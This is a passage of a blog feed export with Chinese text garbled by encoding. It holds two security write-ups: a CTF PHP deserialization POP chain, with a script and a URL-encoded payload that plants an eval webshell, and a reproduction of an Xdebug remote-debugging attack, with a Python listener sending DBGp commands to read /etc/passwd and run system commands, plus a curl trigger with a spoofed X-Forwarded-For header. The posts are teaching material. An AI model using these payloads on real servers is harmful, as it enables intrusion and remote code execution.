</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;song-&gt;get_name() === $name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $oldlyrics = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Porter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exportData</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(serialize($lyrics));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">importData</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(base64_decode($lyrics));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conn</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $conn;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($dbuser, $dbpass, $db)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = mysqli_connect(<span class="string">"localhost"</span>, $dbuser, $dbpass, $db);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $r = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) &#123;</span><br><span class="line">      $s = intval($lyric);</span><br><span class="line">      $result = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"SELECT data FROM lyrics WHERE id=$s"</span>);</span><br><span class="line">      <span class="keyword">while</span> (($row = $result-&gt;fetch_row()) != <span class="keyword">NULL</span>) &#123;</span><br><span class="line">        $r []= unserialize(base64_decode($row[<span class="number">0</span>]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $r;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $ids = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"INSERT INTO lyrics (data) VALUES (\""</span> . base64_encode(serialize($lyric)) . <span class="string">"\")"</span>);</span><br><span class="line">      $res = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">"SELECT MAX(id) FROM lyrics"</span>);</span><br><span class="line">      $id= $res-&gt;fetch_row(); $ids[]= intval($id[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> var_dump($ids);</span><br><span class="line">    <span class="keyword">return</span> $ids; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = <span class="keyword">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unserialize($_GET[<span class="string">'cmd'</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="æ“ä½œè¿‡ç¨‹"><a href="#æ“ä½œè¿‡ç¨‹" class="headerlink" title="æ“ä½œè¿‡ç¨‹"></a>æ“ä½œè¿‡ç¨‹</h3><p>1ã€å…ˆæ‰¾unserializeå‡½æ•°</p>
<p>åœ¨class userä¸­æœ‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span><span class="params">($lyrics)</span> </span>&#123;</span><br><span class="line">    $oldlyrics = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      $oldlyrics = unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($lyrics <span class="keyword">as</span> $lyric) $oldlyrics []= $lyric;</span><br><span class="line">    setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize($oldlyrics)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'lyrics'</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize(base64_decode($_COOKIE[<span class="string">'lyrics'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      setcookie(<span class="string">'lyrics'</span>, base64_encode(serialize(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹åˆ°<code>$oldlyrics = unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));</code>é‡Œé¢cookieå¯æ§</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸€ä¸ªå¯æ§çš„unserializeç‚¹æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p><strong>æ„å‘³ç€ä½ èƒ½æ§åˆ¶{å½“å‰çš„å®šä¹‰çš„ç±»æˆ–è€…è‡ªåŠ¨åŠ è½½èƒ½æ‰¾åˆ°çš„ç±»}çš„å±æ€§</strong>ï¼ˆè¿™ä¸ªå¯¹è±¡å±æ€§å½“ç„¶å¯ä»¥æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼‰</p>
<p>æ¥ç€å°±å¯ä»¥å¯»æ‰¾å¯ä»¥æäº‹çš„é­”æœ¯æ–¹æ³•ï¼Œå¾ˆå¿«å°±ä¼šå‘ç°<code>class Lyrics</code>ä¸­æœ‰ä¸¤ä¸ªé­”æœ¯æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;p&gt;"</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">"&lt;/p&gt;&lt;p&gt;"</span> . str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;br /&gt;"</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">"&lt;/p&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°ä¸¤ä¸ªé­”æœ¯æ–¹æ³•éƒ½æ²¡æœ‰ä»€ä¹ˆæ•æ„Ÿçš„æ“ä½œï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ„é€ POPé“¾</p>
<p>é€šè¯»ä»£ç å¯ä»¥å‘ç°ç¨‹åºå‘˜çš„æœ¬æ„æ˜¯åˆ©ç”¨<code>class song</code>çš„logçš„æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘ç°</p>
<p><code>class Logger</code>ä¹Ÿæœ‰logæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $logwriter;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($writer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = $writer;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ›´åŠ æƒŠå¥‡çš„æ˜¯æˆ‘ä»¬å‘ç°ä¸€ä¸ªå¯ä»¥å†™æ–‡ä»¶çš„ç±»è¿™ä¸ªç±»ä¸­æ–¹æ³•<code>writeLog</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> $filename;</span><br><span class="line">  <span class="keyword">protected</span> $format;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $format)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">".."</span>, <span class="string">"__"</span>, str_replace(<span class="string">"/"</span>, <span class="string">"_"</span>, $filename));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = $format;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span><span class="params">($txt)</span> </span>&#123;</span><br><span class="line">    $txt = <span class="keyword">$this</span>-&gt;format-&gt;format($txt);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="string">"E:\\WWW\\test\\ctf"</span> . <span class="keyword">$this</span>-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤ä¸€æ¡å®Œæ•´çš„POPé“¾æ€è·¯è²Œä¼¼å‡ºç°åœ¨çœ¼å‰</p>
<p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ª<code>Lyrics</code>å¯¹è±¡å°†å®ƒçš„songå±æ€§å¡«å……æˆ<code>Logger</code>å¯¹è±¡,å†<code>æŠŠlogger</code>å¯¹è±¡çš„<code>logwriter</code>çš„å±æ€§å¡«å……æˆ<code>LogWriter_File</code>å¯¹è±¡ï¼Œæœ€åä¼ é€ç»™cookie,åœ¨<code>Lyrics</code>å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™å°±å¯ä»¥è§¦å‘<code>__destruct()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="keyword">new</span> OutputFilter(<span class="string">"//"</span>,<span class="string">"&lt;?php eval(\$_POST['c']);?&gt;"</span>));</span><br><span class="line">$obj1 = <span class="keyword">new</span> LogFileFormat($arr,<span class="string">'\n'</span>);</span><br><span class="line">$obj2 = <span class="keyword">new</span> LogWriter_File(<span class="string">"shell2333.php"</span>,$obj1);</span><br><span class="line">$obj3 = <span class="keyword">new</span> Logger($obj2);</span><br><span class="line">$obj = <span class="keyword">new</span> Lyrics(<span class="string">"2333"</span>,$obj3);</span><br><span class="line">file_put_contents(<span class="string">"serialize.txt"</span>, urlencode(serialize($obj)));</span><br></pre></td></tr></table></figure>
<p>serialize.txtå¯ä»¥æ‰¾åˆ°è¿™ä¸€å¨<br><code>O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A4%3A%222333%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A13%3A%22shell2333.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A26%3A%22%3C%3Fphp+eval%28%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D</code></p>
<p>GETä¸€æ¬¡ï¼Œå³å¯æ‹¿åˆ°shell</p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è®°å½•ä¸€ä¸‹ååºåˆ—åŒ–æ³¨æ„ç‚¹å…·ä½“è§<a href="http://godot.win/index.php/archives/11/">Godotå¸ˆå‚…</a></p>
<p>1ã€<strong>å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)</strong></p>
<p>2ã€<strong>CTFä¸­æˆå‘˜å±æ€§æ•°ç›®å‰é¢å¤šä¸€ä¸ª<code>+</code>å¯ä»¥ç»•è¿‡æ­£åˆ™</strong></p>
<p>3ã€<strong>protectå±æ€§å’Œprivateä¼šäº§ç”Ÿä¸€äº›æµè§ˆå™¨çœ‹ä¸è§çš„å­—ç¬¦</strong></p>
<p>4ã€ä¼šå¾ˆæœ‰ç”¨çš„å‡½æ•° get_included_files() , get_declared_classes()</p>
<p><img src="1.png" alt="1.png"></p>
<p>5ã€å¦‚æœé€šè¿‡ä¸Šé¢çš„å‡½æ•°ä¾ç„¶æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ç±»ï¼Œå¯ä»¥å°è¯•åˆ©ç”¨<code>spl_autoload_register</code></p>
<p>6ã€<a href="http://ph0rse.me/2017/09/27/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E8%B5%B7%E7%9A%84%E6%80%9D%E8%80%83/">sessionåºåˆ—åŒ–ååºåˆ—åŒ–æœºåˆ¶ä¸åŒé€ æˆæ¼æ´</a></p>
<h2 id="æœ€æœ€å"><a href="#æœ€æœ€å" class="headerlink" title="æœ€æœ€å"></a>æœ€æœ€å</h2><p>æ— æ„é—´åœ¨çœ‹<a href="http://php.net/manual/zh/migration56.deprecated.php">phpæ–‡æ¡£</a>çš„æ—¶å€™å‘ç°ä¸€ä¸ª5.6.xååºŸå¼ƒçš„ç‰¹æ€§ï¼Œå«åš ï¼ŒåŠŸèƒ½æ˜¯åœ¨ä¸Šä¸‹æ–‡è¯­å¢ƒä¸­å¯ä»¥è°ƒç”¨ç”¨ç±»::çš„æ¨¡å¼è°ƒç”¨éé™æ€æ–¹æ³•(?)ï¼Œä¸€ä¸ªdemoå¦‚ä¸‹</p>
<p><img src="2.png" alt="2.png"></p>
<h2 id="æœ€æœ€æœ€å"><a href="#æœ€æœ€æœ€å" class="headerlink" title="æœ€æœ€æœ€å"></a>æœ€æœ€æœ€å</h2><p>å¦‚æœ‰é—®é¢˜è¯·æŒ‡æ•™</p>
<p>å›½åº†å¿«ä¹ï¼</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>XdebugåŸç†å­¦ä¹ åŠå…¶æ”»å‡»é¢å¤ç°</title>
    <url>/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- æ”»å‡»æ€è·¯æ¥è‡ª rrå¸ˆå‚…ï¼Œè®°å¾—é‚£å¹´å¸ˆå‚…çš„åšå®¢å«åˆå¿ƒã‚’å¿˜ã‚Œãš -->
<!-- more -->

<h2 id="é€šä¿¡è¿‡ç¨‹"><a href="#é€šä¿¡è¿‡ç¨‹" class="headerlink" title="é€šä¿¡è¿‡ç¨‹"></a>é€šä¿¡è¿‡ç¨‹</h2><p>Xdebugçš„å·¥ä½œåŸç†å¯ä»¥æ€»ç»“ä¸ºä¸‹é¢å‡ ä¸ªæ­¥éª¤</p>
<ol>
<li><p>IDEä¸­å·²ç»é›†æˆäº†ä¸€ä¸ªéµå¾ªBGDpçš„Xdebugæ’ä»¶ã€‚å½“è¦debugçš„æ—¶å€™ï¼Œç‚¹å‡»ä¸€äº›IDEçš„æŸä¸ªæŒ‰é’®ï¼Œå¯åŠ¨è¿™ä¸ªæ’ä»¶ã€‚è¯¥æ’ä»¶ä¼šå¯åŠ¨ä¸€ä¸ª9000çš„ç«¯å£ç›‘å¬è¿œç¨‹æœåŠ¡å™¨å‘è¿‡æ¥çš„debugä¿¡æ¯ã€‚å…¶ä¸­BGDpæ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„é€šä¿¡åè®®</p>
</li>
<li><p>æµè§ˆå™¨å‘HttpdæœåŠ¡å™¨å‘é€ä¸€ä¸ªå¸¦æœ‰XDEBUG_SESSION_STARTå‚æ•°çš„è¯·æ±‚ï¼ŒHttpdæ”¶åˆ°è¿™ä¸ªè¯·æ±‚ä¹‹åäº¤ç»™åç«¯çš„PHPè¿›è¡Œå¤„ç†</p>
</li>
<li><p>Phpï¼ˆæœ‰Xdebugçš„æ‹“å±•ï¼‰çœ‹åˆ°è¿™ä¸ªè¯·æ±‚æ˜¯å¸¦äº†XDEBUG_SESSION_START å‚æ•°ï¼Œå°±å‘Šè¯‰Xdebugï¼Œâ€œå˜¿ï¼Œæˆ‘è¦debugå–”ï¼Œä½ å‡†å¤‡ä¸€ä¸‹â€ã€‚è¿™æ—¶ï¼ŒXdebugè¿™æ—¶ä¼šå‘æ¥æºipå®¢æˆ·ç«¯çš„9000ç«¯å£ï¼ˆIDEç›‘å¬ï¼‰å‘é€ä¸€ä¸ªdebugè¯·æ±‚ï¼Œç„¶åå®¢æˆ·ç«¯çš„9000ç«¯å£å“åº”è¿™ä¸ªè¯·æ±‚ï¼Œé‚£ä¹ˆdebugå°±å¼€å§‹äº†ã€‚</p>
</li>
<li><p>PhpçŸ¥é“Xdebugå·²ç»å‡†å¤‡å¥½äº†ï¼Œé‚£ä¹ˆå°±å¼€å§‹å¼€å§‹ä¸€è¡Œä¸€è¡Œçš„æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯æ¯æ‰§è¡Œä¸€è¡Œéƒ½ä¼šè®©Xdebugè¿‡æ»¤ä¸€ä¸‹ã€‚</p>
</li>
<li><p>Xdebugå¼€å§‹è¿‡æ»¤ä»£ç ï¼ŒXdebugåœ¨è¿‡æ»¤æ¯ä¸€è¡Œä»£ç çš„æ—¶å€™ï¼Œéƒ½ä¼šæš‚åœä»£ç çš„æ‰§è¡Œï¼Œç„¶åå‘å®¢æˆ·ç«¯çš„9000ç«¯å£å‘é€è¯¥è¡Œä»£ç çš„æ‰§è¡Œæƒ…å†µï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„å†³ç­–ã€‚</p>
</li>
<li><p>ç›¸åº”ï¼Œå®¢æˆ·ç«¯ï¼ˆIDEï¼‰æ”¶åˆ°Xdebugå‘é€è¿‡æ¥çš„æ‰§è¡Œæƒ…å†µï¼Œå°±å¯ä»¥æŠŠè¿™äº›ä¿¡æ¯å±•ç¤ºç»™å¼€å‘è€…çœ‹äº†ï¼ŒåŒ…æ‹¬ä¸€äº›å˜é‡çš„å€¼ç­‰ã€‚åŒæ—¶å‘Xdebugå‘é€ä¸‹ä¸€æ­¥åº”è¯¥ä»€ä¹ˆã€‚</p>
</li>
</ol>
<p>å®é™…è¿‡ç¨‹ä¸­çš„æŠ“åŒ…å¦‚å›¾<br><img src="1.png" alt="1.png"></p>
<p>å½“é“¾æ¥å»ºç«‹æˆåŠŸçš„æ—¶å€™phpç«¯ä¼š[PSHï¼ŒACK]</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">init</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">fileuri</span>=<span class="string">"file:///var/www/html/test1.php"</span> <span class="attr">language</span>=<span class="string">"PHP"</span> <span class="attr">xdebug:language_version</span>=<span class="string">"7.0.22-2"</span> <span class="attr">protocol_version</span>=<span class="string">"1.0"</span> <span class="attr">appid</span>=<span class="string">"2000"</span> <span class="attr">idekey</span>=<span class="string">"phpstorm"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">engine</span> <span class="attr">version</span>=<span class="string">"2.5.5"</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Xdebug]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">engine</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Derick Rethans]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[http://xdebug.org]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">copyright</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">copyright</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­æœ‰è¾“å‡ºï¼Œå¹¶ä¸ä¼šç«‹å³å‡ºç°åœ¨ç½‘é¡µä¸Šï¼Œå¾…å…¨éƒ¨è°ƒè¯•ç»“æŸåæ‰ä¼šè¾“å‡ºåˆ°ç½‘é¡µä¸­ï¼Œè°ƒè¯•çš„ä¹‹å‰ä½ éœ€è¦ç¡®ä¿ä½ å·²ç»é…ç½®å¥½äº†xdebugæ‰©å±•(php.ini)ã€‚</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ”»å‡»æ€è·¯æ¥è‡ª<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface">åˆå¿ƒã‚’å¿˜ã‚Œãš</a></p>
<p>è¿™é‡Œå°†æ–‡ä¸­æåˆ°çš„å§¿åŠ¿è¿›è¡Œå¤ç°,å·ä¸€æ³¢è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">ip_port = (<span class="string">'0.0.0.0'</span>,<span class="number">9000</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(<span class="number">10</span>)</span><br><span class="line">conn, addr = sk.accept()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(client_data)</span><br><span class="line">    data = raw_input(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#è¯»æ–‡ä»¶</span></span><br><span class="line">    conn.sendall(<span class="string">'source -i 1 -f %s\x00'</span> % data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="comment">#conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ‰§è¡Œå‘½ä»¤2</span></span><br><span class="line">    <span class="comment">#conn.sendall('property_set -n $a -i 1 -c 1 -- %s\x00' % data.encode('base64'))</span></span><br></pre></td></tr></table></figure>

<p>è§¦å‘æ¼æ´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">'http://192.168.169.88/test1.php?XDEBUG_SESSION_START=phpstorm'</span> -H <span class="string">"X-Forwarded-For: 192.168.169.36"</span></span><br></pre></td></tr></table></figure>

<h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>file:///etc/passwd<br><img src="2.png" alt=""></p>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>system(â€œidâ€);<br><img src="3.png" alt=""></p>
<h3 id="property-set"><a href="#property-set" class="headerlink" title="property_set"></a>property_set</h3><p>system(â€œidâ€);<br><img src="6.png" alt=""></p>
<p>é€€å‡ºåå¯ä»¥çœ‹åˆ°<br><img src="7.png" alt=""></p>
<p>å°è¯•å†™shellå¤±è´¥ï¼ˆtestæ˜¯777ï¼‰ï¼Œå¿½ç„¶æƒ³åˆ°å¯ä»¥base64ã€‚<br><img src="8.png" alt=""></p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>åˆ©ç”¨æ¡ä»¶æ˜¯è¦xdebug.remote_connect_backå¼€å¯</p>
<p>åœ¨æ–‡æ¡£æ˜¯è¿™æ ·æè¿°çš„ï¼š<br>xdebug.remote_connect_back<br>ç±»å‹: boolean, é»˜è®¤å€¼: 0, å§‹äº Xdebug &gt; 2.1</p>
<p>å¦‚æœè®¾ç½®ç”Ÿæ•ˆï¼Œ xdebug.remote_host è®¾ç½®ä¼šå¿½ç•¥è€ŒXdebugä¼šå°è¯•ç»™åˆ¶é€ HTTPè¯·æ±‚çš„å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ã€‚å®ƒä¼šæ£€æŸ¥$_SERVER[â€˜REMOTE_ADDRâ€™] å˜é‡å¹¶æ‰¾å‡ºä½¿ç”¨çš„IPåœ°å€ã€‚è¯·è®°ä½å®ƒæ²¡æœ‰æœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä»»ä½•äººéƒ½èƒ½å¯åŠ¨è°ƒè¯•ä¼šè¯è¿æ¥åˆ°æœåŠ¡å™¨ï¼Œå³ä½¿ä»–ä»¬çš„åœ°å€å¹¶ä¸åŒ¹é… xdebug.remote_host.</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://my.oschina.net/atanl/blog/371424?fromerr=FV9ksMPu">Xdebugå·¥ä½œåŸç†</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°å½•xssæŒ‘æˆ˜èµ›14é¢˜è§£é¢˜è¿‡ç¨‹</title>
    <url>/2017/09/01/%E8%AE%B0%E5%BD%95xss%E6%8C%91%E6%88%98%E8%B5%9B14%E9%A2%98%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
